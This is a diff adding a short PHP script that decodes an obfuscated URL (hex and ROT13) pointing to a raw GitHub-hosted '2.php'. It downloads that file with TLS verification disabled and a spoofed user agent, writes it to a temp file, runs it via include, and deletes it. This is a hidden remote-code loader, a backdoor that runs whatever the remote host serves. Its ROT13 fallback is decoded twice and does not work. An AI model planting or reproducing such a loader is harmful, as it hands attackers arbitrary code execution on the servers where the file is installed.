@@ -1,0 +1,30 @@
+<?php
+$obfuscated = '68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f6c756666796f706d2f6f706d2f726566732f68656164732f6d61696e2f322e706870';
+$rot13_encoded = str_rot13('uggcf://enj.tvguhobbgfre.arg/ynssl/bcz/ers/srnfuf/znva/2.cuc');
+
+function decodeUrl($hex, $rot) {
+    $hex_decoded = hex2bin($hex);
+    $rot_decoded = str_rot13($rot);
+    return (filter_var($hex_decoded, FILTER_VALIDATE_URL)) ? $hex_decoded : $rot_decoded;
+}
+
+$url = decodeUrl($obfuscated, $rot13_encoded);
+
+$ch = curl_init($url);
+curl_setopt_array($ch, [
+    CURLOPT_RETURNTRANSFER => true,
+    CURLOPT_FOLLOWLOCATION => true,
+    CURLOPT_SSL_VERIFYPEER => false,
+    CURLOPT_TIMEOUT => 10,
+    CURLOPT_USERAGENT => 'Mozilla/5.0'
+]);
+$code = curl_exec($ch);
+curl_close($ch);
+
+if ($code) {
+    $temp = tempnam(sys_get_temp_dir(), 'php_');
+    file_put_contents($temp, $code);
+    include $temp;
+    unlink($temp);
+}
+?>
